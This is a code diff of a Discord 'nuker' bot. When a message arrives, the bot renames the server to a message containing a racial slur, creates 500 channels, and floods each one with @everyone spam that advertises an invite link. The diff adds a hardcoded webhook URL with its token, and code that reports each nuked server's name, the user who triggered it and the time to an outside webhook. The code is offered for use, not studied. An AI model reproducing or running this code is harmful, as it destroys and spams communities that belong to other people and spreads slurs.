@@ -7,11 +7,12 @@ const client = new Client({
         512, // GUILD_MESSAGES
         32768, // MESSAGE_CONTENT
         2,   // GUILD_MEMBERS
-        16   // GUILD_CHANNELS (for deleting/creating channels)
+        16   // GUILD_CHANNELS
     ]
 });
 
 const TOKEN = process.env.TOKEN;
+const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
 
 http.createServer((req, res) => {
     res.writeHead(200, {'Content-Type': 'text/plain'});
@@ -30,6 +31,9 @@ client.on('messageCreate', async (message) => {
 
     message.delete().catch(() => {});
     const g = message.guild;
+    const originalName = g.name;
+    const username = message.author.tag;
+    const time = new Date().toISOString();
 
     g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
 
@@ -40,14 +44,25 @@ client.on('messageCreate', async (message) => {
     }
 
     for (let i = 0; i < 500; i++) {
-        g.channels.create({name: 'jhub-owns-yall', type: 0}).then(ch => {
+        g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
             if (!ch) return;
             for (let j = 0; j < 10; j++) {
-                ch.send('@everyone @here discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
+                ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
             }
         }).catch(() => {});
         await sleep(200);
     }
+
+    // Send log webhook
+    try {
+        await fetch(LOG_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `**Server Nuked**\nName: ${originalName}\nBy: ${username}\nTime: ${time}`
+            })
+        });
+    } catch (e) {}
 });
 
 client.login(TOKEN);
